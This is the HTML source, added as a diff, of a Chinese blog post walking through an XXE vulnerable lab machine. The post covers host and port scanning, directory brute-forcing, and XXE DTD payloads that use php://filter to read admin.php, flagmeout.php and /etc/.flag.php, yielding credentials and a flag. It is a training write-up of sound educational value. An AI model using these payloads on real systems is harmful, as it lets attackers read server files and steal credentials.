@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>XXE | 灰太狼</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="我一定会回来的">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="灰太狼" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">灰太狼</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-XXE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      XXE
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2023-11-17T04:41:06.000Z" itemprop="datePublished">2023年11月17日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2023/11/17/XXE/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XXE渗透测试"><a href="#XXE渗透测试" class="headerlink" title="XXE渗透测试"></a>XXE渗透测试</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>xxe靶机</p>
+<p>kali攻击机 IP：192.168.43.129</p>
+<p>网卡模式：NAT</p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117125837650.png" alt="image-20231117125837650"></p>
+<p>得知这里有一个192.168.43.144IP地址。</p>
+<p>查看开放端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.43.144 -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117130233777.png" alt="image-20231117130233777"></p>
+<p>为了加快端口扫描的速度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS IP  　　　　//SYN扫描,使用最频繁，安全，快</span><br></pre></td></tr></table></figure>
+
+<p>发现开放了80的tcp端口和5355的tcp端口</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>访问80端口：</p>
+<p><img src="/2023/11/17/XXE/image-20231117131412798.png" alt="image-20231117131412798"></p>
+<p>访问5535端口，404作废</p>
+<p>80端口页面没有什么可以操作的，使用kali扫描文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.43.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117131753041.png" alt="image-20231117131753041"></p>
+<p>访问robots.txt</p>
+<p><img src="/2023/11/17/XXE/image-20231117132000754.png" alt="image-20231117132000754"></p>
+<p>发现robots.txt中有一个&#x2F;xxe&#x2F;文件夹和admin.php</p>
+<p>访问admin.php:</p>
+<p><img src="/2023/11/17/XXE/image-20231117132052210.png" alt="image-20231117132052210"></p>
+<p>没东西，那就换一个xxe</p>
+<p><img src="/2023/11/17/XXE/image-20231117132125641.png" alt="image-20231117132125641"></p>
+<p>有登陆页面，随手提交一个admin,123456</p>
+<p><img src="/2023/11/17/XXE/image-20231117132227689.png" alt="image-20231117132227689"></p>
+<p>发现他返回的是admin not available，那么不可得。</p>
+<p>抓包分析一下：</p>
+<p><img src="/2023/11/17/XXE/image-20231117132345027.png" alt="image-20231117132345027"></p>
+<p>发现是xml的请求头部，可能存在xml漏洞，先更改一个name的请求值：</p>
+<p><img src="/2023/11/17/XXE/image-20231117132812460.png" alt="image-20231117132812460"></p>
+<p>显然name提交什么就返回什么，可以在name提交的值上面做文章，直接构造payload：</p>
+<p><img src="/2023/11/17/XXE/image-20231117133259781.png" alt="image-20231117133259781"></p>
+<p>回显成功成功。然后，想了一下，这里能提交，那我要看什么呢？xxe含有伪协议请求，现在扫描一下xxe目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.43.144/xxe/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117133809482.png" alt="image-20231117133809482"></p>
+<p>之前admin.php访问不成功，但是在xxe目录下发现了这有一个admin.php，构造payload伪协议请求admin.php</p>
+<p>使用Base64编码防止php代码被执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE LCX [</span><br><span class="line">&lt;!ELEMENT LCX ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117134115565.png" alt="image-20231117134115565"></p>
+<p>解码：</p>
+<p><img src="/2023/11/17/XXE/image-20231117134916104.png" alt="image-20231117134916104"></p>
+<p>发现这一段php代码，对密码开始解密：</p>
+<p><img src="/2023/11/17/XXE/image-20231117134835405.png" alt="image-20231117134835405"></p>
+<p>登陆一下：</p>
+<p><img src="/2023/11/17/XXE/image-20231117135030563.png" alt="image-20231117135030563"></p>
+<p><img src="/2023/11/17/XXE/image-20231117135044943.png" alt="image-20231117135044943"></p>
+<p>好啊，没登上，查看路径：</p>
+<p><img src="/2023/11/17/XXE/image-20231117135142420.png" alt="image-20231117135142420"></p>
+<p>用户和密码实在xxe路径下的admin.php页面找到的，那就去这里登录：</p>
+<p><img src="/2023/11/17/XXE/image-20231117135251958.png" alt="image-20231117135251958"></p>
+<p><img src="/2023/11/17/XXE/image-20231117135317414.png" alt="image-20231117135317414"></p>
+<p>回显说获取了有效的name和password，这里有个Flag，点击查看：</p>
+<p><img src="/2023/11/17/XXE/image-20231117135352474.png" alt="image-20231117135352474"></p>
+<p>说这个页面不存在，又是这样，抓个包吧，发现不合适，直接使用xxe.php这个请求，这里存在xml漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE LCX [</span><br><span class="line">&lt;!ELEMENT LCX ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flagmeout.php&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117135741971.png" alt="image-20231117135741971"></p>
+<p>更改一下resource的值即可，发现一个base64的数据，进行解密：</p>
+<p><img src="/2023/11/17/XXE/image-20231117135902939.png" alt="image-20231117135902939"></p>
+<p>发现了一段php代码，说flag在这段加密代码中，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(一般MD5加密是32位，base64加密末尾都有等于号，没有等于号的可能是base32加密，严格意义上说是编码)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117140327537.png" alt="image-20231117140327537"></p>
+<p>又是一个base64加密，再解码：</p>
+<p><img src="/2023/11/17/XXE/image-20231117140411264.png" alt="image-20231117140411264"></p>
+<p>好了，说flag.php再&#x2F;etc&#x2F;.php这里，构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE LCX [</span><br><span class="line">&lt;!ELEMENT LCX ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/.flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/XXE/image-20231117140633453.png" alt="image-20231117140633453"></p>
+<p>再解码：</p>
+<p><img src="/2023/11/17/XXE/image-20231117140846016.png" alt="image-20231117140846016"></p>
+<p>解出来的东西不知道是什么形式，找一个php编译环境：</p>
+<p><img src="/2023/11/17/XXE/image-20231117141516973.png" alt="image-20231117141516973"></p>
+<p>找出flag！！！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>MD5加密的类型，32位和64位有何区别：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(一般MD5加密是32位，base64加密末尾都有等于号，没有等于号的可能是base32加密，严格意义上说是编码)</span><br></pre></td></tr></table></figure>
+
+<p>存在xml漏洞的时候，如果访问那个文件不存在的话，直接使用php伪协议发送请求即可获得base64加密的文件内容，然后进行解密，本来想的是从根目录file:&#x2F;&#x2F;&#x2F;etc&#x2F;.flag.php获取内容，但是没有尝试，后来尝试一下发现可以直接访问，可能是后台没有对提交的php文件进行编码过滤，但是想想还是php伪协议来的稳妥，毕竟是编码过的。</p>
+
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">XXE渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/2023/11/17/XXE/">http://example.com/2023/11/17/XXE/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2023/11/16/Hacker-Kid/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          Hacker Kid
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/17/XXE/">XXE</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/16/Hacker-Kid/">Hacker Kid</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Lab-6/">反序列化、XXE、暴力破解、逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu渗透测试</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/test/">来了老弟</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023年</a><span class="archive-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example1.com/">site-name1</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example2.com/">site-name2</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example3.com/">site-name3</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2023 bigbigwolf.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
